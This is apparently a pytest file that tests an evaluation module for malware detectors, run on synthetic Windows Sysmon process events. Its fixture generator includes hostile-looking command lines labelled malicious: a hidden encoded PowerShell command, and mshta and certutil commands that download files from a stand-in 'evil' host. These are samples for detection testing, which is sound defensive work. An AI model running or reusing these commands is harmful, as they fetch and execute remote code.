"""Tests for detect.evaluate: metric primitives + the full run on synthetic data."""

from pathlib import Path

import numpy as np
import pandas as pd

from detect import evaluate

RULES_DIR = Path(__file__).parent.parent / "rules"

_COLS = ["event_record_id", "timestamp", "provider", "event_id", "channel",
         "host", "session_id", "source", "action", "process_guid", "process_id",
         "image", "command_line", "integrity_level", "parent_process_guid",
         "parent_image", "dest_ip", "dest_port", "label", "technique_id"]


# --- metric primitives -------------------------------------------------------

def test_binary_metrics_known():
    y = np.array([1, 1, 0, 0, 1], dtype=bool)
    p = np.array([1, 0, 0, 1, 1], dtype=bool)
    m = evaluate.binary_metrics(y, p)
    assert (m["tp"], m["fp"], m["fn"], m["tn"]) == (2, 1, 1, 1)
    assert m["precision"] == 2 / 3
    assert m["recall"] == 2 / 3


def test_fp_per_10k_benign():
    y = np.array([0, 0, 0, 0], dtype=bool)
    p = np.array([1, 0, 0, 0], dtype=bool)
    assert evaluate.fp_per_10k_benign(y, p) == 2500.0
    assert np.isnan(evaluate.fp_per_10k_benign(np.array([1, 1], dtype=bool), np.array([1, 1], dtype=bool)))


def test_pr_auc_single_class_is_nan():
    assert np.isnan(evaluate.pr_auc(np.array([1, 1], dtype=bool), np.array([0.2, 0.8])))
    val = evaluate.pr_auc(np.array([0, 1, 0, 1], dtype=bool), np.array([0.1, 0.9, 0.2, 0.8]))
    assert 0.0 <= val <= 1.0


# --- synthetic event generator ----------------------------------------------

def _proc(session, source, guid, image, cmd, label, technique, rid, day, net=False):
    rows = [{**{c: None for c in _COLS},
             "event_record_id": rid, "timestamp": f"2021-03-{day:02d}T12:00:00Z",
             "provider": "Microsoft-Windows-Sysmon", "event_id": 1, "action": "process_create",
             "host": "lab01", "session_id": session, "source": source, "process_guid": guid,
             "image": image, "command_line": cmd, "integrity_level": "Medium",
             "parent_image": r"C:\Windows\explorer.exe", "label": label, "technique_id": technique}]
    if net:
        rows.append({**{c: None for c in _COLS}, "event_record_id": rid + 1000,
                     "timestamp": f"2021-03-{day:02d}T12:00:05Z", "action": "network_connect",
                     "host": "lab01", "session_id": session, "source": source, "process_guid": guid,
                     "dest_ip": "10.0.0.5", "dest_port": 4444, "label": label, "technique_id": technique})
    return rows


def _events():
    rows, rid = [], 0
    for day in range(1, 7):
        sess = f"s{day}"
        for b in range(4):  # benign
            rid += 1
            rows += _proc(sess, "lab", f"{{b{day}{b}}}", r"C:\Windows\System32\cmd.exe",
                          "cmd /c dir", "benign", None, rid, day)
        rid += 1  # malicious, alternating technique
        if day % 2:
            rows += _proc(sess, "lab", f"{{m{day}}}",
                          r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                          "powershell -nop -w hidden -enc ZABpAHIA", "malicious", "T1059.001", rid, day, net=True)
        else:
            rows += _proc(sess, "lab", f"{{m{day}}}", r"C:\Windows\System32\mshta.exe",
                          "mshta https://evil/x.hta", "malicious", "T1218.005", rid, day, net=True)
    # public (eval-only) session
    for b in range(2):
        rid += 1
        rows += _proc("pub", "public", f"{{pb{b}}}", r"C:\Windows\System32\cmd.exe",
                      "cmd /c whoami", "benign", None, rid, 1)
    rid += 1
    rows += _proc("pub", "public", "{pm}", r"C:\Windows\System32\certutil.exe",
                  "certutil -urlcache -f http://evil/x.exe x.exe", "malicious", "T1105", rid, 1, net=True)
    return pd.DataFrame(rows, columns=_COLS)


def test_run_evaluation_end_to_end():
    result = evaluate.run_evaluation(_events(), rules_dir=RULES_DIR, test_size=0.4, n_boot=50)
    s = result.summary
    assert set(s["approach"]) == {
        "Rules (A)", "Rarity (B)", "Isolation Forest",
        "Local Outlier Factor", "Combined (rules OR IF)",
    }
    assert "public" in set(s["split"])  # public forced into test

    # Thresholds were chosen (one per unsupervised model) and are finite/+inf.
    assert set(result.thresholds) == {"Isolation Forest", "Local Outlier Factor", "Rarity (B)"}

    # All synthetic malicious processes are rule-covered -> Rules recall == 1.0.
    rules_col = result.per_technique["Rules (A)"].dropna()
    assert (rules_col == 1.0).all()

    # Combined recall >= Rules recall on the overall split (union can't lose a hit).
    all_rows = s[s["split"] == "all"].set_index("approach")
    assert all_rows.loc["Combined (rules OR IF)", "recall"] >= all_rows.loc["Rules (A)", "recall"]
    # Metrics are finite where defined.
    assert np.isfinite(all_rows.loc["Rules (A)", "pr_auc"])


def test_run_evaluation_explanations_present():
    result = evaluate.run_evaluation(_events(), rules_dir=RULES_DIR, test_size=0.4, n_boot=50)
    # Rule-alerted malicious processes must carry an explanation with their rule.
    assert "top_features" in result.explanations.columns
    assert "rules" in result.explanations.columns
    assert not result.explanations.empty  # the malicious procs are rule-covered


def test_bootstrap_ci_wraps_point_and_orders_bounds():
    rng = np.random.default_rng(0)
    y = np.array([0, 0, 0, 1, 1, 1, 0, 0, 1, 1], dtype=bool)
    groups = np.array(["a", "a", "b", "b", "c", "c", "d", "d", "e", "e"])
    pred = y.copy()  # perfect predictor
    score = y.astype(float)
    ci = evaluate.bootstrap_ci(y, groups, {"perfect": (pred, score)}, n_boot=200, seed=1)
    for _, r in ci.iterrows():
        assert r["ci_lo"] <= r["point"] <= r["ci_hi"] or np.isnan(r["point"])
    rec = ci[ci["metric"] == "recall"].iloc[0]
    assert rec["point"] == 1.0  # perfect predictor recalls all

    _ = rng  # determinism documented; seed drives the draws


def test_run_evaluation_has_confidence_intervals():
    result = evaluate.run_evaluation(_events(), rules_dir=RULES_DIR, test_size=0.4, n_boot=50)
    assert set(result.ci["metric"]) == {"recall", "precision", "fp_per_10k", "pr_auc"}
    # Every approach in the summary also has CIs.
    assert set(result.ci["approach"]) == set(result.summary["approach"])


def test_write_reports_creates_files(tmp_path):
    result = evaluate.run_evaluation(_events(), rules_dir=RULES_DIR, test_size=0.4, n_boot=50)
    evaluate.write_reports(result, tmp_path)
    assert (tmp_path / "summary.csv").exists()
    assert (tmp_path / "results.md").exists()
    assert "Evaluation results" in (tmp_path / "results.md").read_text()
